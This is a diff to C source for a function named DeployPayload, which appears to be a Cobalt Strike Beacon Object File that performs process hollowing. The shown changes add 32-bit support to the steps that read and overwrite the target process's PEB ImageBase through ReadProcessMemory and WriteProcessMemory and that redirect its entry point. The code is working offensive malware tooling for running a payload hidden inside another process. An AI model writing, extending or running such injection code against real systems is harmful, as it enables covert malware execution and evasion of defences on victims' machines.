@@ -425,12 +425,21 @@ BOOL DeployPayload(IN BYTE* pPayloadData, IN DWORD dwPayloadSize,
         goto CLEANUP;
     }
 
+#ifdef _WIN64
     ULONG_PTR pebAddr = ctxThread.Rdx;
+#else
+    ULONG_PTR pebAddr = ctxThread.Ebx;
+#endif
     ULONG_PTR origImageBase = 0;
     SIZE_T br = 0;
 
+#ifdef _WIN64
     if (!KERNEL32$ReadProcessMemory(stProcInfo.hProcess, (PVOID)(pebAddr + 0x10),
             &origImageBase, sizeof(origImageBase), &br)) {
+#else
+    if (!KERNEL32$ReadProcessMemory(stProcInfo.hProcess, (PVOID)(pebAddr + 0x08),
+            &origImageBase, sizeof(origImageBase), &br)) {
+#endif
         BeaconPrintf(CALLBACK_ERROR, "Read PEB ImageBase: %lu", KERNEL32$GetLastError());
         goto CLEANUP;
     }
@@ -549,8 +558,13 @@ BOOL DeployPayload(IN BYTE* pPayloadData, IN DWORD dwPayloadSize,
     /* --- Step 10: Update PEB ImageBase --- */
     {
         ULONG_PTR newBase = (ULONG_PTR)pRemoteMem;
+#ifdef _WIN64
         KERNEL32$WriteProcessMemory(stProcInfo.hProcess, (PVOID)(pebAddr + 0x10),
             &newBase, sizeof(newBase), &dwBytesWritten);
+#else
+        KERNEL32$WriteProcessMemory(stProcInfo.hProcess, (PVOID)(pebAddr + 0x08),
+            &newBase, sizeof(newBase), &dwBytesWritten);
+#endif
     }
 
     /* --- Step 11: Set entry point via RCX --- */
